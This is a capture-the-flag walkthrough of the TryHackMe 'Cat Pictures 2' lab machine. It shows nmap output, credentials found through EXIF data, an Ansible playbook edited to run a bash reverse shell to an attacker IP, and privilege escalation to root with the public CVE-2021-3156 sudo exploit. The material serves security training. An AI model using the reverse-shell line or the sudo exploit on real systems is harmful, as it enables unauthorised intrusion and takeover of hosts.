# TryHackMe Cat Pictures 2 Writeup

## ``Nmap``

```
nmap -sCV 10.10.152.104
```

``Output``

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 08:41 EDT
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.89% done; ETC: 08:42 (0:00:00 remaining)
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 92.50% done; ETC: 08:42 (0:00:00 remaining)
Nmap scan report for 10.10.152.104
Host is up (0.53s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
|_http-title: Lychee
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-git: 
|   10.10.152.104:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
|_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
3000/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=236005864be879af; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=nv7yyPHab95b-zxnqa-KYphn3286MTc0ODE3NjkxMDQ1NjIwMjA2NQ; Path=/; Expires=Mon, 26 May 2025 12:41:50 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 25 May 2025 12:41:50 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=a63af3899e3eba34; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=91h1_jJSehnVK_d6m3l7ue7y05s6MTc0ODE3NjkxMzIwMDA3ODQxOQ; Path=/; Expires=Mon, 26 May 2025 12:41:53 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 25 May 2025 12:41:53 GMT
|_    Content-Length: 0
|_http-title:  Gitea: Git with a cup of tea
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Welcome to nginx!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=5/25%Time=6833100E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,28EC,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset
SF:=UTF-8\r\nSet-Cookie:\x20i_like_gitea=236005864be879af;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=nv7yyPHab95b-zxnqa-KYp
SF:hn3286MTc0ODE3NjkxMDQ1NjIwMjA2NQ;\x20Path=/;\x20Expires=Mon,\x2026\x20M
SF:ay\x202025\x2012:41:50\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSit
SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2025\x20May\x
SF:202025\x2012:41:50\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
SF:-US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</
SF:title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;bas
SF:e64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWU
SF:iOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2
SF:xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOp
SF:tions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Contro
SF:l:\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=a63af389
SF:9e3eba34;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_cs
SF:rf=91h1_jJSehnVK_d6m3l7ue7y05s6MTc0ODE3NjkxMzIwMDA3ODQxOQ;\x20Path=/;\x
SF:20Expires=Mon,\x2026\x20May\x202025\x2012:41:53\x20GMT;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0
SF:;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDat
SF:e:\x20Sun,\x2025\x20May\x202025\x2012:41:53\x20GMT\r\nContent-Length:\x
SF:200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.55 seconds
```

```
22/tcp   open  ssh
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh
3000/tcp open  http    Golang net/http server
8080/tcp open  http    SimpleHTTPServer
```

open website on port `80` found some cats pictues:

![image](https://github.com/user-attachments/assets/846a6257-c9b3-4fd2-8881-293a40727b65)

i try to se `exifdata` of each one found data in this photo 

![image](https://github.com/user-attachments/assets/d5b119c1-40ca-44b7-981b-8dc4888937d8)

![image](https://github.com/user-attachments/assets/f78306f8-bea0-46be-8d56-39edbf9c32c2)

```
:8080/764efa883dda1e11db47671c4a3bbd9e.txt
```
i opent it and boom found password and username of `gitea` on port `3000`

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

``Don't forget that``

```
ansible runner (olivetin): port 1337
```

![image](https://github.com/user-attachments/assets/9260e44c-9a78-4e3b-8384-437b0a959912)

```
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: bash -c "bash -i >& /dev/tcp/10.6.49.189/5555 0>&1"
```

![image](https://github.com/user-attachments/assets/c22c4b7c-8dbd-44fe-bce2-d5871e43f2a3)

now listen on 5555:

```
nc -lvpn 5555
```

open ansibel and click ``Run ansible playbook``

![image](https://github.com/user-attachments/assets/264eabb6-57eb-4922-a051-baec2f873c5a)

now for ``prevesc``

![image](https://github.com/user-attachments/assets/680b92ef-8d54-46fd-91ff-c07d958e17a0)

notice that ``sudo version`` is old

![image](https://github.com/user-attachments/assets/66fa7446-f996-43ca-956e-9e5f69daae6f)

![image](https://github.com/user-attachments/assets/8dce471e-60e4-45a5-95be-b8dfecb3b0c1)

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
```

```
make
```

```
./sudo-hax-me-a-sandwich
```

``output``

```
bismuth@catpictures-ii:~/exploit$ ./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

```bash
bismuth@catpictures-ii:~/exploit$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
bismuth@catpictures-ii:~/exploit$ /usr/bin/sudo --version
/usr/bin/sudo --version

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
bismuth@catpictures-ii:~/exploit$ 
bismuth@catpictures-ii:~/exploit$ ldd /bin/ls | grep libc
ldd /bin/ls | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc84d412000)
bismuth@catpictures-ii:~/exploit$ ./sudo-hax-me-a-sandwich 0
./sudo-hax-me-a-sandwich 0

whoami
root

```

![image](https://github.com/user-attachments/assets/18ece628-2123-4b38-81c5-e9601cd8d843)

